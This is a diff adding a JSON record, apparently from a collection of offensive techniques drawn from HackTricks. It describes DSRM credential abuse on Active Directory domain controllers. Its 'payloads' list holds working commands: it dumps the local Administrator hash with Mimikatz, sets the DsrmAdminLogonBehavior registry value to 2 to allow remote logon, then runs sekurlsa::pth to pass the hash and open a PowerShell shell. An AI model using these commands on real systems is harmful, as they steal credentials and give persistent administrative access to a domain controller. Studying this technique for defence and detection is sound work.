@@ -1,0 +1,27 @@
+{
+  "id": "windows_hardening_d9661a31e5d9",
+  "category": "windows-hardening",
+  "title": "dsrm credentials",
+  "description": "# DSRM Credentials\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Basic Information\n\nThere is a **local administrator** account inside each **DC**. Having admin privileges in this machine you can use mimikatz to **dump the local Administrator hash**. Then, modifying a registry to **activate this password** so you can remotely access to this local Administrator user.\\\nFirst we need to **dump** the **hash** of the **local Administrator** user inside the DC:\n\n```bash\nInvoke-Mimikatz -Comman",
+  "payloads": [
+    "# DSRM Credentials",
+    "{{#include ../../banners/hacktricks-training.md}}",
+    "## Basic Information",
+    "There is a **local administrator** account inside each **DC**. Having admin privileges in this machine you can use mimikatz to **dump the local Administrator hash**. Then, modifying a registry to **activate this password** so you can remotely access to this local Administrator user.\\",
+    "First we need to **dump** the **hash** of the **local Administrator** user inside the DC:",
+    "```bash",
+    "Invoke-Mimikatz -Command '\"token::elevate\" \"lsadump::sam\"'",
+    "Then we need to check if that account will work, and if the registry key has the value \"0\" or it doesn't exist you need to **set it to \"2\"**:",
+    "```bash",
+    "Get-ItemProperty \"HKLM:\\SYSTEM\\CURRENTCONTROLSET\\CONTROL\\LSA\" -name DsrmAdminLogonBehavior #Check if the key exists and get the value",
+    "New-ItemProperty \"HKLM:\\SYSTEM\\CURRENTCONTROLSET\\CONTROL\\LSA\" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value \"2\" if it doesn't exist",
+    "Set-ItemProperty \"HKLM:\\SYSTEM\\CURRENTCONTROLSET\\CONTROL\\LSA\" -name DsrmAdminLogonBehavior -value 2  #Change value to \"2\"",
+    "Then, using a PTH you can **list the content of C$ or even obtain a shell**. Notice that for creating a new powershell session with that hash in memory (for the PTH) **the \"domain\" used is just the name of the DC machine:**",
+    "```bash",
+    "sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe"
+  ],
+  "source": "HackTricks",
+  "references": [
+    "/workspaces/hunter-skill/hacktricks/src/windows-hardening/active-directory-methodology/dsrm-credentials.md"
+  ]
+}
